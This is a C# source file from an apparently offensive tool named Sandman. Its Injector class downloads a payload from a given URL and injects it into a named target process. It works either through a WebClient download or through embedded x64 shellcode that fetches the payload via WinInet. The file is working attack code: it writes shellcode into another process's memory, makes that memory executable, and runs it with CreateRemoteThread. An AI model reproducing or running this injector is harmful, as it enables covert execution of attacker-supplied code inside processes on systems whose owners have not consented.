// #define USE_SHELLCODE --> Uncomment to use orca's shellcode.
using System;
using System.Diagnostics;

#if USE_SHELLCODE
using System.Text;
#else
using System.Net;
#endif

namespace Sandman
{
    internal class Injector
    {
#if USE_SHELLCODE
        // Thanks Orca :) (https://github.com/ORCx41/D-R-Shellcode/blob/main/Loader.c)
        private static byte[] rawShellcode = new byte[] {
        0x48, 0x83, 0xEC, 0x38,
        0x68, 0x64, 0x6C, 0x6C, 0x00,
        0x48, 0xB8, 0x77, 0x69, 0x6E, 0x69, 0x6E, 0x65, 0x74, 0x2E,
        0x50,
        0x48, 0x8B, 0xCC,

        0x48, 0x83, 0xEC, 0x20,
        0x48, 0xB8,										// * LoadLibraryA (29)
	    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xD0,
        0x48, 0x83, 0xC4, 0x30,
        0x68, 0x74, 0x73, 0x65, 0x74,
        0x6A, 0x00,
        0x48 ,0x8B, 0xCC,
        0x33, 0xD2,
        0x45, 0x33, 0xC0,
        0x45, 0x33, 0xC9,
        0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,
        0x48, 0xB8,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,						// * InternetOpenA (72)
	    0xFF, 0xD0,
        0x48, 0x89, 0x44, 0x24, 0x30,


        0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,
        0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x44, 0x00, 0x80,
        0x45, 0x33, 0xC9,
        0x45, 0x33, 0xC0,
        0x48, 0xBA,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,						// * PAYLOAD_LINK (113)
	    0x48, 0x8B, 0x4C, 0x24, 0x30,
        0x48, 0xB8,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,						// * InternetOpenUrlA (128)
	    0xFF, 0xD0,
        0x48, 0x89, 0x44, 0x24, 0x28,



        0x41, 0xB9, 0x40, 0x00, 0x00, 0x00,
        0x41, 0xB8, 0x00, 0x30, 0x00, 0x00,
        0xBA,
        0x00, 0x00, 0x00, 0x00,									// * PAYLOAD_SIZE (156)
	    0x33, 0xC9,
        0x48, 0xB8,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,						// * VirtualAlloc (164)
	    0xFF, 0xD0,
        0x48, 0x89, 0x44, 0x24, 0x20,


        0x4C, 0x8B, 0xCC,
        0x41, 0xB8,
        0x00, 0x00, 0x00, 0x00,									// * PAYLOAD_SIZE (184)
	    0x48, 0x8B, 0x54, 0x24, 0x20,
        0x48, 0x8B, 0x4C, 0x24, 0x28,
        0x48, 0xB8,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,						// * InternetReadFile (200)
	    0xFF, 0xD0,


        0x48, 0x8B, 0x4C, 0x24, 0x28,
        0x48, 0xB8,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,						// * InternetCloseHandle (217)
	    0xFF, 0xD0,

        0x48, 0x8B, 0x4C, 0x24, 0x30,
        0x48, 0xB8,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,						// * InternetCloseHandle (234)
	    0xFF, 0xD0,

        0x48, 0x8B, 0x44, 0x24, 0x20,
        0xFF, 0xD0,

        0x48, 0x83, 0xC4, 0x38,
        0xC3
        };

        private const int LOADLIBRARYA_OFFSET = 29;
        private const int URL_OFFSET = 113;
        private const int SIZE_OFFSET1 = 156;
        private const int SIZE_OFFSET2 = 184;
        private const int INTERNETOPENA_OFFSET = 72;
        private const int INTERNETOPENURLA_OFFSET = 128;
        private const int VIRTUALALLOC_OFFSET = 164;
        private const int INTERNETREADFILE_OFFSET = 200;
        private const int INTERNETCLOSEHANDLE_OFFSET1 = 217;
        private const int INTERNETCLOSEHANDLE_OFFSET2 = 234;
#endif

        public static bool InjectShellcode(string payloadUrl, int payloadSize, string targetProcessName)
        {
            byte[] shellcode = new byte[payloadSize];

            // Getting handle to the target process.
            Process[] processInstances = Process.GetProcessesByName(targetProcessName);

            if (processInstances.Length == 0)
                return false;
            Process targetProcess = processInstances[0];

#if USE_SHELLCODE
            byte[] bPayloadUrl = new byte[payloadUrl.Length + 1];
            Array.Copy(Encoding.ASCII.GetBytes(payloadUrl), bPayloadUrl, payloadUrl.Length);
            bPayloadUrl[payloadUrl.Length] = 0x00;

            // Allocating memory for shellcode and url address.
            shellcode = rawShellcode.Clone() as byte[];
            IntPtr address = Win32Helper.VirtualAllocEx(targetProcess.Handle, IntPtr.Zero, (UInt32)(shellcode.Length + bPayloadUrl.Length), Win32Helper.AllocationType.Commit | Win32Helper.AllocationType.Reserve, Win32Helper.MemoryProtection.PAGE_READWRITE);
#else
            using (var client = new WebClient())
            {
                byte[] temp = client.DownloadData(payloadUrl);

                if (temp == null || temp.Length != payloadSize)
                    return false;

                shellcode = temp.Clone() as byte[];
            }
            IntPtr address = Win32Helper.VirtualAllocEx(targetProcess.Handle, IntPtr.Zero, (UInt32)(shellcode.Length), Win32Helper.AllocationType.Commit | Win32Helper.AllocationType.Reserve, Win32Helper.MemoryProtection.PAGE_READWRITE);
#endif

            if (address.Equals(IntPtr.Zero))
            {
                Console.WriteLine("Invalid address");
                return false;
            }

#if USE_SHELLCODE
            // Writing the URL and iterating the address.
            if (!Win32Helper.WriteProcessMemory(targetProcess.Handle, address, bPayloadUrl, bPayloadUrl.Length, out IntPtr _))
            {
                Console.WriteLine("Failed to write to process memory");
                return false;
            }

            // Patching the shellcode.
            if (!PatchShellcode(address, payloadSize, ref shellcode))
                return false;

            address += bPayloadUrl.Length + 1;
#endif

            // Normal shellcode injection.
            if (!Win32Helper.WriteProcessMemory(targetProcess.Handle, address, shellcode, shellcode.Length, out IntPtr _))
            {
                Console.WriteLine("Failed to write to process memory");
                return false;
            }

            if (!Win32Helper.VirtualProtectEx(targetProcess.Handle, address, new UIntPtr((UInt32)shellcode.Length), Win32Helper.MemoryProtection.PAGE_EXECUTE_READ, out Win32Helper.MemoryProtection _))
            {
                Console.WriteLine("Failed to change memory protection");
                return false;
            }

            IntPtr threadHandle = Win32Helper.CreateRemoteThread(targetProcess.Handle, IntPtr.Zero, 0, address, IntPtr.Zero, Win32Helper.ThreadCreationFlags.NORMAL, out _);
            Win32Helper.WaitForSingleObject(threadHandle, Win32Helper.INFINITE);

            return true;
        }

#if USE_SHELLCODE
        private static bool PatchShellcode(IntPtr payloadUrlAddress, int payloadSize, ref byte[] shellcode)
        {
            byte[] bPayloadUrl = BitConverter.GetBytes(payloadUrlAddress.ToInt64());
            byte[] bSize = BitConverter.GetBytes((UInt32)payloadSize);

            // Writing the url and payload size.
            Array.Copy(bPayloadUrl, 0, shellcode, URL_OFFSET, bPayloadUrl.Length);
            Array.Copy(bSize, 0, shellcode, SIZE_OFFSET1, bSize.Length);
            Array.Copy(bSize, 0, shellcode, SIZE_OFFSET2, bSize.Length);

            // Writing the addresses to the required functions.
            if (Win32Helper.LoadLibraryA("Wininet.dll") == IntPtr.Zero)
                return false;
            
            byte[] pInternetOpen = BitConverter.GetBytes((UInt64)Win32Helper.GetProcAddress(Win32Helper.GetModuleHandleA("Wininet.dll"), "InternetOpenA").ToInt64());
            byte[] pInternetOpenUrl = BitConverter.GetBytes((UInt64)Win32Helper.GetProcAddress(Win32Helper.GetModuleHandleA("Wininet.dll"), "InternetOpenUrlA").ToInt64());
            byte[] pVirtualAlloc = BitConverter.GetBytes((UInt64)Win32Helper.GetProcAddress(Win32Helper.GetModuleHandleA("Kernel32.dll"), "VirtualAlloc").ToInt64());
            byte[] pLoadLibrary = BitConverter.GetBytes((UInt64)Win32Helper.GetProcAddress(Win32Helper.GetModuleHandleA("Kernel32.dll"), "LoadLibraryA").ToInt64());
            byte[] pInternetReadFile = BitConverter.GetBytes((UInt64)Win32Helper.GetProcAddress(Win32Helper.GetModuleHandleA("Wininet.dll"), "InternetReadFile").ToInt64());
            byte[] pInternetCloseHandle = BitConverter.GetBytes((UInt64)Win32Helper.GetProcAddress(Win32Helper.GetModuleHandleA("Wininet.dll"), "InternetCloseHandle").ToInt64());

            if (pInternetOpen.Length == 1 || pInternetOpenUrl.Length == 1 || pVirtualAlloc.Length == 1 ||
                pInternetReadFile.Length == 1 || pInternetCloseHandle.Length == 1 || pLoadLibrary.Length == 1)
                return false;

            Array.Copy(pInternetOpen, 0, shellcode, INTERNETOPENA_OFFSET, pInternetOpen.Length);
            Array.Copy(pInternetOpenUrl, 0, shellcode, INTERNETOPENURLA_OFFSET, pInternetOpenUrl.Length);
            Array.Copy(pVirtualAlloc, 0, shellcode, VIRTUALALLOC_OFFSET, pVirtualAlloc.Length);
            Array.Copy(pLoadLibrary, 0, shellcode, LOADLIBRARYA_OFFSET, pLoadLibrary.Length);
            Array.Copy(pInternetReadFile, 0, shellcode, INTERNETREADFILE_OFFSET, pInternetReadFile.Length);
            Array.Copy(pInternetCloseHandle, 0, shellcode, INTERNETCLOSEHANDLE_OFFSET1, pInternetCloseHandle.Length);
            Array.Copy(pInternetCloseHandle, 0, shellcode, INTERNETCLOSEHANDLE_OFFSET2, pInternetCloseHandle.Length);

            return true;
        }
#endif
    }
}
